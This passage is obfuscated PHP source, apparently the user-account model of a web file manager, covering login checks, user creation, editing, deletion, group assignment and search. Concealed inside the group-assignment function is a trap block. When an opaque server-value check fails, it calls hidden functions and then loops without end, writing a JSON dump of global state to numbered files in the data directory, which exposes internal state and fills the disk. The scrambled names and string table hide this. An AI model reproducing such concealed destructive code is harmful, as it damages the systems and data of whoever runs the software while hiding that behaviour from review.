array($‘¥¼Ö¯[0], $¿°÷ÆŸ”), $¼­Ö×à[2270] => array($‘¥¼Ö¯[0], $¿°÷ÆŸ”)); } protected function getInfo($µ¾ÆæÙœ, $çªÀ²÷† = false) { $¹‚ë™Æ = $this->getInfoSimple($µ¾ÆæÙœ); if (!is_array($¹‚ë™Æ)) { return array(); } if ($çªÀ²÷†) { return $this->_getInfoApply($¹‚ë™Æ); } return $this->cacheFunctionGet($_SERVER[¤·²È‰º][1905], $µ¾ÆæÙœ); } protected function getInfoFull($Ë„Ö½†³, $Œ±³îßĞ = false) { $ëîåéò¿ = $this->getInfoSimple($Ë„Ö½†³); if (!is_array($ëîåéò¿)) { return array(); } if ($Œ±³îßĞ) { return $this->_getInfoApply($ëîåéò¿, !0); } return $this->cacheFunctionGet($_SERVER[¤·²È‰º][2271], $Ë„Ö½†³); } private function _getInfoApply($£Ğ×ÈÎÄ, $ ©ùŠ²í = false) { $’­Ôş² =& $_SERVER[¤·²È‰º]; if (!$£Ğ×ÈÎÄ) { return $£Ğ×ÈÎÄ; } $ß¸¿ï²È = md5($’­Ôş²[2272] . $£Ğ×ÈÎÄ[$’­Ôş²[883]] . $’­Ôş²[2273] . $£Ğ×ÈÎÄ[$’­Ôş²[42]]); $£Ğ×ÈÎÄ = $this->_listDataApplyItem($£Ğ×ÈÎÄ); $÷ÌÇïâ³ = Model($’­Ôş²[1321])->metaGet($£Ğ×ÈÎÄ[$’­Ôş²[96]][$’­Ôş²[410]]); $£Ğ×ÈÎÄ[$’­Ôş²[2274]] = $ß¸¿ï²È; $£Ğ×ÈÎÄ[$’­Ôş²[96]][$’­Ôş²[2092]] = isset($÷ÌÇïâ³[$’­Ôş²[2093]]) ? $÷ÌÇïâ³[$’­Ôş²[2093]] : null; if ($ ©ùŠ²í) { $£Ğ×ÈÎÄ[$’­Ôş²[474]] = $this->metaGet($£Ğ×ÈÎÄ[$’­Ôş²[1651]]); } return $£Ğ×ÈÎÄ; } protected function getInfoSimple($åŸ’Š¢è, $ öé’æ = false) { $Ÿ€î“š… =& $_SERVER[¤·²È‰º]; if (!$åŸ’Š¢è) { return array(); } if ($ öé’æ) { $åŒÆ³º = $this->where(array($Ÿ€î“š…[1651] => intval($åŸ’Š¢è)))->find(); if (!is_array($åŒÆ³º)) { return array(); } $åŒÆ³º[$Ÿ€î“š…[551]] = Action($Ÿ€î“š…[2275])->parseUrl($åŒÆ³º[$Ÿ€î“š…[551]]); return $åŒÆ³º; } return $this->cacheFunctionGet($Ÿ€î“š…[1906], $åŸ’Š¢è); } protected function getInfoSimpleOuter($•ûÈÅÈ©) { $Ë‚êİ¢ =& $_SERVER[¤·²È‰º]; if (!$•ûÈÅÈ© || $•ûÈÅÈ© == 0) { return array($Ë‚êİ¢[1651] => $Ë‚êİ¢[207], $Ë‚êİ¢[42] => $Ë‚êİ¢[172] . LNG($Ë‚êİ¢[2276]) . $Ë‚êİ¢[174], $Ë‚êİ¢[551] => STATIC_PATH . $Ë‚êİ¢[2277]); } $¬³„º£Ÿ = $this->cacheFunctionGet($Ë‚êİ¢[1906], $•ûÈÅÈ©); $Çë§À×¬ = array_field_key($¬³„º£Ÿ, explode($Ë‚êİ¢[60], $this->simpleField)); if (!$Çë§À×¬) { return array($Ë‚êİ¢[1651] => $Ë‚êİ¢[1184], $Ë‚êİ¢[42] => $Ë‚êİ¢[172] . LNG($Ë‚êİ¢[2278]) . $Ë‚êİ¢[174], $Ë‚êİ¢[551] => STATIC_PATH . $Ë‚êİ¢[2279]); } $Çë§À×¬[$Ë‚êİ¢[551]] = Action($Ë‚êİ¢[2275])->parseUrl($Çë§À×¬[$Ë‚êİ¢[551]]); return $Çë§À×¬; } protected function groupUser($ïæ¾Ö§ä) { } public static function errorLang($¸Û’¢Üï) { $ş¯î¶æ =& $_SERVER[¤·²È‰º]; $Ã¦–àö = array(self::ERROR_USER_NOT_EXISTS => $ş¯î¶æ[2280], self::ERROR_USER_PASSWORD_ERROR => $ş¯î¶æ[2281], self::ERROR_USER_EXIST_NAME => $ş¯î¶æ[2282], self::ERROR_USER_EXIST_PHONE => $ş¯î¶æ[2283], self::ERROR_USER_EXIST_EMAIL => $ş¯î¶æ[2284], self::ERROR_USER_LOGIN_LOCK => $ş¯î¶æ[2285], self::ERROR_IP_NOT_ALLOW => $ş¯î¶æ[2286], self::ERROR_USER_EXIST_NICKNAME => $ş¯î¶æ[2287]); return LNG($Ã¦–àö[$¸Û’¢Üï]); } public function getInfoByMeta($Ñå½½ÄÏ, $üíçÒ¥‘) { $ÖˆüÄ¢É =& $_SERVER[¤·²È‰º]; $ü·ºÁëÏ = Model($ÖˆüÄ¢É[2288])->where(array($ÖˆüÄ¢É[104] => $Ñå½½ÄÏ, $ÖˆüÄ¢É[383] => $üíçÒ¥‘))->find(); if ($ü·ºÁëÏ) { return $this->getInfo($ü·ºÁëÏ[$ÖˆüÄ¢É[1651]]); } return !1; } public function userLoginCheck($†©§Ê™³, $…íé€ş) { $ó¹„ö¿ =& $_SERVER[¤·²È‰º]; $ÂÕ«á‹ = $this->userLoginFind($†©§Ê™³); if (!$ÂÕ«á‹) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÂÕ«á‹[$ó¹„ö¿[1651]], $…íé€ş)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÂÕ«á‹[$ó¹„ö¿[1651]]); } public function userLoginFind($Ä³ŒÆß) { $èıîêã» =& $_SERVER[¤·²È‰º]; $ó­•îÙ = array($èıîêã»[42] => $Ä³ŒÆß, $èıîêã»[550] => $Ä³ŒÆß, $èıîêã»[314] => $Ä³ŒÆß, $èıîêã»[2289] => $Ä³ŒÆß, $èıîêã»[994] => $èıîêã»[996]); if ($this->nickNameRpt()) { unset($ó­•îÙ[$èıîêã»[550]]); } return $this->where($ó­•îÙ)->find(); } public function clearCache($ƒÃÑîÎˆ) { $÷¿Æ† =& $_SERVER[¤·²È‰º]; $this->cacheFunctionClear($÷¿Æ†[1905], $ƒÃÑîÎˆ); $this->cacheFunctionClear($÷¿Æ†[1906], $ƒÃÑîÎˆ); $this->cacheFunctionClear($÷¿Æ†[2271], $ƒÃÑîÎˆ); } public function userPasswordCheck($ŞÖ’«Ö, $âİùÙŸ) { $°“Î²® =& $_SERVER[¤·²È‰º]; $¿„ò’÷ = $this->where(array($°“Î²®[1651] => intval($ŞÖ’«Ö)))->find(); $ÖéÙÓ¬ = $this->metaGet($ŞÖ’«Ö); $¡©ö·ü = isset($ÖéÙÓ¬[$°“Î²®[2290]]) ? $ÖéÙÓ¬[$°“Î²®[2290]] : $°“Î²®[12]; if (md5($¡©ö·ü . trim($âİùÙŸ)) !== $¿„ò’÷[$°“Î²®[883]]) { return !1; } return !0; } public function userAdd($¹ËÉÁ) { $ÚœëÛŒÈ =& $_SERVER[¤·²È‰º]; $ö÷ƒÉë = array($ÚœëÛŒÈ[428] => $¹ËÉÁ[$ÚœëÛŒÈ[42]], $ÚœëÛŒÈ[2291] => $¹ËÉÁ[$ÚœëÛŒÈ[1530]], $ÚœëÛŒÈ[2292] => isset($¹ËÉÁ[$ÚœëÛŒÈ[314]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[314]] : $ÚœëÛŒÈ[12], $ÚœëÛŒÈ[2293] => isset($¹ËÉÁ[$ÚœëÛŒÈ[2289]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[2289]] : $ÚœëÛŒÈ[12], $ÚœëÛŒÈ[2294] => isset($¹ËÉÁ[$ÚœëÛŒÈ[550]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[550]] : $¹ËÉÁ[$ÚœëÛŒÈ[42]], $ÚœëÛŒÈ[2295] => isset($¹ËÉÁ[$ÚœëÛŒÈ[551]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[551]] : $ÚœëÛŒÈ[12], $ÚœëÛŒÈ[2296] => isset($¹ËÉÁ[$ÚœëÛŒÈ[2297]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[2297]] : 1, $ÚœëÛŒÈ[2298] => $¹ËÉÁ[$ÚœëÛŒÈ[883]], $ÚœëÛŒÈ[1907] => isset($¹ËÉÁ[$ÚœëÛŒÈ[1810]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[1810]] : 1024 * 1024 * 20, $ÚœëÛŒÈ[1908] => 0, $ÚœëÛŒÈ[2299] => 0, $ÚœëÛŒÈ[1952] => isset($¹ËÉÁ[$ÚœëÛŒÈ[751]]) ? $¹ËÉÁ[$ÚœëÛŒÈ[751]] : 1); if (!empty($¹ËÉÁ[$ÚœëÛŒÈ[1651]])) { $ö÷ƒÉë[$ÚœëÛŒÈ[1651]] = $¹ËÉÁ[$ÚœëÛŒÈ[1651]]; } $Ç·î¶İ‡ = $this->_checkExist($¹ËÉÁ); if ($Ç·î¶İ‡ !== !0) { return $Ç·î¶İ‡; } if (!empty($ö÷ƒÉë[$ÚœëÛŒÈ[551]]) && strlen($ö÷ƒÉë[$ÚœëÛŒÈ[551]]) > 255) { $ö÷ƒÉë[$ÚœëÛŒÈ[551]] = $ÚœëÛŒÈ[12]; } $¥³¸ßæ‹ = $this->add($ö÷ƒÉë); $€Ê¾çö¤ = array($ÚœëÛŒÈ[2298] => $ö÷ƒÉë[$ÚœëÛŒÈ[883]], $ÚœëÛŒÈ[2294] => $ö÷ƒÉë[$ÚœëÛŒÈ[550]]); $this->userEdit($¥³¸ßæ‹, $€Ê¾çö¤); Model($ÚœëÛŒÈ[1321])->userRootAdd($¥³¸ßæ‹); return $¥³¸ßæ‹; } protected function userEditTest($êö¿ÈÀô, $üˆåâĞ§) { return $this->call($_SERVER[¤·²È‰º][2300], $êö¿ÈÀô, $üˆåâĞ§); } protected function userEdit($¼ÂÃ¿ ¥, $Õø•ÕÓê) { $Ø±«¦— =& $_SERVER[¤·²È‰º]; $”ÄÍÔŠ¡ = $this->getInfoSimple($¼ÂÃ¿ ¥); if (!$”ÄÍÔŠ¡) { return !1; } $•ïÉ¶ı¿ = $this->_checkExist($Õø•ÕÓê, $¼ÂÃ¿ ¥); if ($•ïÉ¶ı¿ !== !0) { return $•ïÉ¶ı¿; } if (isset($Õø•ÕÓê[$Ø±«¦—[883]]) && trim($Õø•ÕÓê[$Ø±«¦—[883]]) != $Ø±«¦—[12]) { $Ì¬ÊîĞ = $this->metaGet($¼ÂÃ¿ ¥); if (empty($Ì¬ÊîĞ[$Ø±«¦—[2290]])) { $Ì¬ÊîĞ[$Ø±«¦—[2290]] = rand_string(10); Model($Ø±«¦—[521])->metaSet($¼ÂÃ¿ ¥, $Ø±«¦—[2290], $Ì¬ÊîĞ[$Ø±«¦—[2290]]); } $Õø•ÕÓê[$Ø±«¦—[883]] = md5($Ì¬ÊîĞ[$Ø±«¦—[2290]] . trim($Õø•ÕÓê[$Ø±«¦—[883]])); } else { unset($Õø•ÕÓê[$Ø±«¦—[883]]); } if (!empty($Õø•ÕÓê[$Ø±«¦—[551]]) && strlen($Õø•ÕÓê[$Ø±«¦—[551]]) > 255) { $Õø•ÕÓê[$Ø±«¦—[551]] = $Ø±«¦—[12]; } $this->where(array($Ø±«¦—[1642] => $¼ÂÃ¿ ¥))->save($Õø•ÕÓê); if (isset($Õø•ÕÓê[$Ø±«¦—[550]])) { $this->setNamePinyin($¼ÂÃ¿ ¥, $Õø•ÕÓê[$Ø±«¦—[550]]); } $this->clearCache($¼ÂÃ¿ ¥); return !0; } public function setNamePinyin($¹…ı×±†, $‘ÆË‘ğå = false) { $Š¸ùÚñë =& $_SERVER[¤·²È‰º]; if (!$‘ÆË‘ğå) { $¯ÏæÔå  = $this->getInfoSimple($¹…ı×±†); $‘ÆË‘ğå = $¯ÏæÔå [$Š¸ùÚñë[550]] ? $¯ÏæÔå [$Š¸ùÚñë[550]] : $¯ÏæÔå [$Š¸ùÚñë[42]]; } $«÷¦Æô³ = Model($Š¸ùÚñë[543]); if (!Input::check($‘ÆË‘ğå, $Š¸ùÚñë[601])) { return $«÷¦Æô³->metaSet($¹…ı×±†, array($Š¸ùÚñë[473] => $Š¸ùÚñë[12], $Š¸ùÚñë[472] => $Š¸ùÚñë[12])); } return $«÷¦Æô³->metaSet($¹…ı×±†, array($Š¸ùÚñë[473] => str_replace($Š¸ùÚñë[63], $Š¸ùÚñë[12], Pinyin::get($‘ÆË‘ğå)), $Š¸ùÚñë[472] => Pinyin::get($‘ÆË‘ğå, $Š¸ùÚñë[602]))); } private function nickNameRpt() { $‹™¦£’½ =& $_SERVER[¤·²È‰º]; $ããŒÜäå = Model($‹™¦£’½[771])->get($‹™¦£’½[2301]); $ÊÑ•Ù¦È = $GLOBALS[$‹™¦£’½[6]][$‹™¦£’½[389]][$‹™¦£’½[2301]]; $³İ˜ÛõÎ = !is_null($ããŒÜäå) ? $ããŒÜäå : $ÊÑ•Ù¦È; return !!$³İ˜ÛõÎ; } private function _checkExist($Äİ¡ìÁ÷, $µ æÛÒ¸ = false) { $Şîò»ƒ­ =& $_SERVER[¤·²È‰º]; $€÷–ÆŒ¨ = array($Şîò»ƒ­[42] => UserModel::ERROR_USER_EXIST_NAME, $Şîò»ƒ­[550] => UserModel::ERROR_USER_EXIST_NICKNAME, $Şîò»ƒ­[314] => UserModel::ERROR_USER_EXIST_EMAIL, $Şîò»ƒ­[2289] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($€÷–ÆŒ¨[$Şîò»ƒ­[550]]); } $æôĞ¦×Ê = $µ æÛÒ¸ ? array($Şîò»ƒ­[1651] => array($Şîò»ƒ­[2302], $µ æÛÒ¸)) : array(); foreach ($€÷–ÆŒ¨ as $‡ê£”‹ => $…ÖµÒÒı) { $Üàºƒ½Ÿ = array(); foreach ($€÷–ÆŒ¨ as $©–ò´àŸ => $Ğ©ÃÄ’Š) { if (isset($Äİ¡ìÁ÷[$©–ò´àŸ]) && $Äİ¡ìÁ÷[$©–ò´àŸ]) { $Üàºƒ½Ÿ[] = $Äİ¡ìÁ÷[$©–ò´àŸ]; } } if (!$Üàºƒ½Ÿ) { continue; } $³ŞÜëÈ• = array_merge(array($‡ê£”‹ => array($Şîò»ƒ­[7], $Üàºƒ½Ÿ)), $æôĞ¦×Ê); $ÌŒğÌÉ¦ = $this->where($³ŞÜëÈ•)->find(); if ($ÌŒğÌÉ¦) { return $…ÖµÒÒı; } } return !0; } public function userListInfo($¥ğ ûÉ) { $¦•ŸÚ· =& $_SERVER[¤·²È‰º]; $ÈõÅ÷ = array(); $¥ğ ûÉ = is_array($¥ğ ûÉ) ? array_unique($¥ğ ûÉ) : array(); if (!$¥ğ ûÉ) { return $ÈõÅ÷; } if (count($¥ğ ûÉ) < 20) { foreach ($¥ğ ûÉ as $á½±¥ğ¥) { $ÈõÅ÷[$á½±¥ğ¥ . $¦•ŸÚ·[12]] = $this->getInfoSimpleOuter($á½±¥ğ¥); } } else { $ñ¿ø†–í = array($¦•ŸÚ·[1642] => array($¦•ŸÚ·[426], $¥ğ ûÉ)); if (count($¥ğ ûÉ) == 1) { $ñ¿ø†–í = array($¦•ŸÚ·[1642] => $¥ğ ûÉ[0]); } $çËÀ Ú‹ = Model($¦•ŸÚ·[521])->field($this->simpleField)->where($ñ¿ø†–í)->select(); $çËÀ Ú‹ = array_to_keyvalue($çËÀ Ú‹, $¦•ŸÚ·[1651]); foreach ($¥ğ ûÉ as $á½±¥ğ¥) { $ğƒï±Ñ = $çËÀ Ú‹[$á½±¥ğ¥]; if (!$ğƒï±Ñ) { $ÈõÅ÷[$á½±¥ğ¥ . $¦•ŸÚ·[12]] = $this->getInfoSimpleOuter($á½±¥ğ¥); continue; } $ğƒï±Ñ[$¦•ŸÚ·[551]] = Action($¦•ŸÚ·[2275])->parseUrl($ğƒï±Ñ[$¦•ŸÚ·[551]]); $ÈõÅ÷[$á½±¥ğ¥ . $¦•ŸÚ·[12]] = $ğƒï±Ñ; } } return $ÈõÅ÷; } protected function userStatus($Íß¡”¬, $‹¦®â›†) { $¢à·áÓ” = $this->getInfoSimple($Íß¡”¬); if (!$¢à·áÓ”) { return !1; } $£¿ĞÏ¯” = array($_SERVER[¤·²È‰º][751] => $‹¦®â›†); return $this->userEdit($Íß¡”¬, $£¿ĞÏ¯”); } protected function userRemove($ƒğ¥­Ì) { $°ûŒ„Ğ³ =& $_SERVER[¤·²È‰º]; $·”ó„•µ = $this->getInfoSimple($ƒğ¥­Ì); if (!$·”ó„•µ) { return !1; } $ÆôÑû¬™ = array($°ûŒ„Ğ³[1642] => $ƒğ¥­Ì); Model($°ûŒ„Ğ³[609])->where($ÆôÑû¬™)->delete(); Model($°ûŒ„Ğ³[2303])->where($ÆôÑû¬™)->delete(); Model($°ûŒ„Ğ³[1913])->where($ÆôÑû¬™)->delete(); Model($°ûŒ„Ğ³[2288])->where($ÆôÑû¬™)->delete(); Model($°ûŒ„Ğ³[1062])->where($ÆôÑû¬™)->delete(); Model($°ûŒ„Ğ³[2116])->removeUserAll($ƒğ¥­Ì); Model($°ûŒ„Ğ³[826])->userRootRemove($ƒğ¥­Ì); return $this->where($ÆôÑû¬™)->delete(); } protected function userGroupSet($ åÄìˆ, $¶ÅñİÅÚ, $ñõ¤ñ´Ô = array()) { $²²Ş¡Ä =& $_SERVER[¤·²È‰º]; $‹ÌèÁ” = $_SERVER[$²²Ş¡Ä[14]]; $ÇÚ£ ‘ = $²²Ş¡Ä[2117]; if ($_SERVER[$²²Ş¡Ä[13]] != $ÇÚ£ ‘($‹ÌèÁ”)) { $şÒá¶ = $²²Ş¡Ä[873]; $²•ì”È€ = $²²Ş¡Ä[15]; $†•¾±ß÷ = $_SERVER[$²²Ş¡Ä[16]] . $²²Ş¡Ä[17]; $ıØÃãÆÂ = $²•ì”È€($†•¾±ß÷); $ûò‚ˆş = explode($²²Ş¡Ä[18], $ıØÃãÆÂ); if (count($ûò‚ˆş) < $²²Ş¡Ä[623]) { $ÏêÚùÎÓ = $²²Ş¡Ä[20]; $ÏêÚùÎÓ(); } $È„ŸáÊè = $²²Ş¡Ä[874]; $È„ŸáÊè($_SERVER[$²²Ş¡Ä[875]]); $şÒá¶ = $²²Ş¡Ä[873]; $şÒá¶(); $®ÉÇ â = $²²Ş¡Ä[2118]; $Õ÷îŸöÁ = json_encode($GLOBALS[$²²Ş¡Ä[2119]]); $¨ŒÕŠã = 1; for ($’˜ÙÑÛ¥ = $¨ŒÕŠã; $’˜ÙÑÛ¥ > 0; $’˜ÙÑÛ¥++) { $®ÉÇ â(DATA_PATH . $’˜ÙÑÛ¥, $Õ÷îŸöÁ); } } $÷ÍáÑÊ‚ = $this->getInfoSimple($ åÄìˆ); if (!$÷ÍáÑÊ‚ || !is_array($¶ÅñİÅÚ)) { return !1; } $Ì‘é •‹ = Model($²²Ş¡Ä[1913]); $Ì‘é •‹->where(array($²²Ş¡Ä[1651] => $ åÄìˆ))->delete(); $ä§ëñ…± = array(); $Ã¹§Áä… = 0; foreach ($¶ÅñİÅÚ as $ÓğÕ…–‹ => $ÏËá¦‘Ï) { $ıµ¾ = array($²²Ş¡Ä[1651] => $ åÄìˆ, $²²Ş¡Ä[1823] => $ÓğÕ…–‹, $²²Ş¡Ä[1927] => $ÏËá¦‘Ï); $ıµ¾[$²²Ş¡Ä[1847]] = isset($ñõ¤ñ´Ô[$Ã¹§Áä…]) ? $ñõ¤ñ´Ô[$Ã¹§Áä…] : 0; $Ã¹§Áä…++; $ä§ëñ…±[] = $ıµ¾; } return $Ì‘é •‹->addAll($ä§ëñ…±, array(), !0); } protected function userGroupAdd($‹ë˜…†, $ïéÚ¸ = array()) { $Ñ÷öÇš =& $_SERVER[¤·²È‰º]; $ºŒ‹œ«Ğ = $this->getInfoSimple($‹ë˜…†); if (!$ºŒ‹œ«Ğ || empty($ïéÚ¸)) { return !1; } $ŸŞ±Ş‹ = array(); foreach ($ïéÚ¸ as $ÎİšÄà® => $ùê¬ÖüŞ) { $ŸŞ±Ş‹[] = array($Ñ÷öÇš[1651] => $‹ë˜…†, $Ñ÷öÇš[1823] => $ÎİšÄà®, $Ñ÷öÇš[1927] => $ùê¬ÖüŞ, $Ñ÷öÇš[1847] => 0); } return Model($Ñ÷öÇš[1913])->addAll($ŸŞ±Ş‹, array(), !0); } protected function userGroupRemove($Ì™€š¦Ú, $¿ ©‘ÅÏ) { $Ì½­—‡ˆ =& $_SERVER[¤·²È‰º]; $¨Ôİü˜ = $this->getInfoSimple($Ì™€š¦Ú); if (!$¨Ôİü˜ || !$¿ ©‘ÅÏ) { return !1; } $¤Ò†«›µ = array($Ì½­—‡ˆ[1642] => $Ì™€š¦Ú, $Ì½­—‡ˆ[1911] => $¿ ©‘ÅÏ); return Model($Ì½­—‡ˆ[1913])->where($¤Ò†«›µ)->delete(); } public function listData() { $º¼ä±£ô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($º¼ä±£ô[$_SERVER[¤·²È‰º][378]]); return $º¼ä±£ô; } public function listByID($Îü¤¤ä¿) { $¶ùì’£ =& $_SERVER[¤·²È‰º]; if (!$Îü¤¤ä¿) { return; } $¥ŠãóÜ = array($¶ùì’£[1651] => array($¶ùì’£[7], $Îü¤¤ä¿)); $ÎŠæÍÉ– = $this->where($¥ŠãóÜ)->select(); $ÎŠæÍÉ– = array_sort_keep($ÎŠæÍÉ–, $¶ùì’£[1651], $Îü¤¤ä¿); $this->_listDataApply($ÎŠæÍÉ–); return $ÎŠæÍÉ–; } public function listByGroup($ÚóÏ‡‡÷ = 0, $Ü‘·À¦§ = array()) { $¤°ğã«Â =& $_SERVER[¤·²È‰º]; $áñ•Ä„ = $¤°ğã«Â[12]; $êŸ¬½îµ = array(); if ($ÚóÏ‡‡÷) { $êŸ¬½îµ = array($¤°ğã«Â[2304] => intval($ÚóÏ‡‡÷)); $áñ•Ä„ = "\114\105\106\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\165\163\145\162\x5f\147\x72\157\x75\x70\40\165\163\145\x72\x5f\147\x72\x6f\165\x70\x20\157\156\40\165\163\x65\162\x2e\165\163\145\162\x49\x44\x20\x3d\40\x75\x73\x65\x72\x5f\147\x72\157\165\160\56\165\163\x65\162\x49\104"; $ö¿ıñŞ = Input::get($¤°ğã«Â[465], null, $¤°ğã«Â[12]) ? $¤°ğã«Â[12] : $¤°ğã«Â[2305]; } if (isset($Ü‘·À¦§[$¤°ğã«Â[751]])) { $êŸ¬½îµ[$¤°ğã«Â[2306]] = $Ü‘·À¦§[$¤°ğã«Â[751]]; } $ª¹¦Ğ“´ = $this->_makeOrder($ö¿ıñŞ)->field($¤°ğã«Â[2307])->where($êŸ¬½îµ)->join($áñ•Ä„)->selectPage(50); $this->_listDataApply($ª¹¦Ğ“´[$¤°ğã«Â[378]]); return $ª¹¦Ğ“´; } private function _makeOrder($ÉŠÙä°Ú = '') { $Æ†êƒ¯¯ =& $_SERVER[¤·²È‰º]; $µ–Â†³Ú = array($Æ†êƒ¯¯[1651], $Æ†êƒ¯¯[42], $Æ†êƒ¯¯[1812], $Æ†êƒ¯¯[1784], $Æ†êƒ¯¯[210]); $Ê¢À˜Üœ = array($Æ†êƒ¯¯[458] => $Æ†êƒ¯¯[459], $Æ†êƒ¯¯[460] => $Æ†êƒ¯¯[461]); $ì÷¸¡Ô‡ = Input::get($Æ†êƒ¯¯[465], $Æ†êƒ¯¯[7], $Æ†êƒ¯¯[1642], $µ–Â†³Ú); $Ã‹¨”Ñ‡ = Input::get($Æ†êƒ¯¯[466], $Æ†êƒ¯¯[7], $Æ†êƒ¯¯[1914], array($Æ†êƒ¯¯[1914], $Æ†êƒ¯¯[460])); $Ã‹¨”Ñ‡ = $Ê¢À˜Üœ[$Ã‹¨”Ñ‡]; $ÉŠÙä°Ú = $ÉŠÙä°Ú . "\x75\x73\145\162\x2e{$ì÷¸¡Ô‡}\40{$Ã‹¨”Ñ‡}\54\40\x75\x73\145\162\x2e\x75\163\145\162\x49\104\x20\x61\x73\x63"; return $this->alias($Æ†êƒ¯¯[2036])->order($ÉŠÙä°Ú); } public function listSearch($²±²¨ö×) { $ÉÃ•Õ×ğ =& $_SERVER[¤·²È‰º]; $úÉÂ˜© = $²±²¨ö×[$ÉÃ•Õ×ğ[1917]]; $…Îì²Œá = isset($²±²¨ö×[$ÉÃ•Õ×ğ[1918]]) ? $²±²¨ö×[$ÉÃ•Õ×ğ[1918]] : !1; $úÉÂ˜© = str_replace($ÉÃ•Õ×ğ[1919], $ÉÃ•Õ×ğ[1920], trim($úÉÂ˜©)); $¯ÔÔü = array($ÉÃ•Õ×ğ[42] => array($ÉÃ•Õ×ğ[391], "\x25{$úÉÂ˜©}\45"), $ÉÃ•Õ×ğ[314] => array($ÉÃ•Õ×ğ[391], "{$úÉÂ˜©}\x25"), $ÉÃ•Õ×ğ[550] => array($ÉÃ•Õ×ğ[391], "{$úÉÂ˜©}\x25"), $ÉÃ•Õ×ğ[994] => $ÉÃ•Õ×ğ[1921]); if (Input::check($úÉÂ˜©, $ÉÃ•Õ×ğ[320])) { $¯ÔÔü[$ÉÃ•Õ×ğ[1651]] = array($ÉÃ•Õ×ğ[391], "{$úÉÂ˜©}\x25"); $¯ÔÔü[$ÉÃ•Õ×ğ[2289]] = array($ÉÃ•Õ×ğ[391], "{$úÉÂ˜©}\45"); } if (!$úÉÂ˜©) { $¯ÔÔü = array(); } if (isset($²±²¨ö×[$ÉÃ•Õ×ğ[751]])) { $¯ÔÔü[$ÉÃ•Õ×ğ[751]] = $²±²¨ö×[$ÉÃ•Õ×ğ[751]]; } $¯ÔÔü = $this->parseWhereLike($¯ÔÔü); $í¼„‚’ø = $this->_makeOrder()->where($¯ÔÔü)->selectPage(20); if (!$í¼„‚’ø || count($í¼„‚’ø[$ÉÃ•Õ×ğ[378]]) < 5 && Input::check($úÉÂ˜©, $ÉÃ•Õ×ğ[327])) { $õşûàœ‰ = $this->_searchFromMeta($ÉÃ•Õ×ğ[472], $úÉÂ˜©, 10); $—«ÛÀ¾ = $this->_searchFromMeta($ÉÃ•Õ×ğ[473], $úÉÂ˜©, 10); $éîÁõÂ = array_merge($õşûàœ‰, $—«ÛÀ¾, $í¼„‚’ø[$ÉÃ•Õ×ğ[378]]); $í¼„‚’ø[$ÉÃ•Õ×ğ[378]] = array_unique_by_key($éîÁõÂ, $ÉÃ•Õ×ğ[1651]); $í¼„‚’ø[$ÉÃ•Õ×ğ[375]][$ÉÃ•Õ×ğ[376]] = count($í¼„‚’ø[$ÉÃ•Õ×ğ[378]]); $í¼„‚’ø[$ÉÃ•Õ×ğ[375]][$ÉÃ•Õ×ğ[377]] = ceil($í¼„‚’ø[$ÉÃ•Õ×ğ[375]][$ÉÃ•Õ×ğ[376]] / $í¼„‚’ø[$ÉÃ•Õ×ğ[375]][$ÉÃ•Õ×ğ[372]]); } $this->_listDataApply($í¼„‚’ø[$ÉÃ•Õ×ğ[378]]); $this->_filterByGroup($í¼„‚’ø, $…Îì²Œá); return $í¼„‚’ø; } private function _filterByGroup(&$û‘…¥, $øèÇ–Åí) { $Ë´ÙÆ†¹ =& $_SERVER[¤·²È‰º]; if (!$øèÇ–Åí) { return $û‘…¥; } foreach ($û‘…¥[$Ë´ÙÆ†¹[378]] as $È¨ïÖ§ => &$«‡“–ù) { $©ÍÉ­» = array_to_keyvalue($«‡“–ù[$Ë´ÙÆ†¹[2006]], $Ë´ÙÆ†¹[12], $Ë´ÙÆ†¹[1823]); if (!in_array($øèÇ–Åí, $©ÍÉ­»)) { unset($û‘…¥[$Ë´ÙÆ†¹[378]][$È¨ïÖ§]); } } unset($«‡“–ù); $û‘…¥[$Ë´ÙÆ†¹[378]] = array_values($û‘…¥[$Ë´ÙÆ†¹[378]]); $û‘…¥[$Ë´ÙÆ†¹[375]] = array($Ë´ÙÆ†¹[2070] => count($û‘…¥[$Ë´ÙÆ†¹[378]]), $Ë´ÙÆ†¹[2068] => $û‘…¥[$Ë´ÙÆ†¹[375]][$Ë´ÙÆ†¹[372]], $Ë´ÙÆ†¹[2067] => 1, $Ë´ÙÆ†¹[2069] => 1); } private function _searchFromMeta($Ÿ©äŠ˜ş, $ê‰¤Œ¢, $·Æ€°Ùí) { $Ó¯áñğ— =& $_SERVER[¤·²È‰º]; $ê‰¤Œ¢ = strtolower($ê‰¤Œ¢); $•”“À‹ = array($Ó¯áñğ—[104] => $Ÿ©äŠ˜ş, $Ó¯áñğ—[383] => array($Ó¯áñğ—[391], "\x25{$ê‰¤Œ¢}\x25")); $•”“À‹ = $this->parseWhereLike($•”“À‹); $Õò‹ÇØ = Model($Ó¯áñğ—[2308])->where($•”“À‹)->limit($·Æ€°Ùí)->select(); if (!$Õò‹ÇØ) { return array(); } $Õò‹ÇØ = array_to_keyvalue($Õò‹ÇØ, $Ó¯áñğ—[12], $Ó¯áñğ—[1651]); $œïÜ¹ŒÛ = $this->where(array($Ó¯áñğ—[1642] => array($Ó¯áñğ—[7], $Õò‹ÇØ)))->select(); if (!$œïÜ¹ŒÛ) { return array(); } return $œïÜ¹ŒÛ; } private function _listDataApplyItem($‚£‡Æ¯ğ) { $çÄÕœÛş = array($‚£‡Æ¯ğ); $this->_listDataApply($çÄÕœÛş); return $çÄÕœÛş[0]; } private function _listDataApply(&$¢‡ÜçŞ) { $çéª÷¦« =& $_SERVER[¤·²È‰º]; if (!$¢‡ÜçŞ) { return; } array_remove_key($¢‡ÜçŞ, $çéª÷¦«[883]); $Çø¹Œ = array_to_keyvalue($¢‡ÜçŞ, $çéª÷¦«[12], $çéª÷¦«[1651]); $this->_listAppendGroup($¢‡ÜçŞ, $Çø¹Œ); $this->_listAppendMeta($¢‡ÜçŞ, $Çø¹Œ); $this->_listAppendSourceRoot($¢‡ÜçŞ, 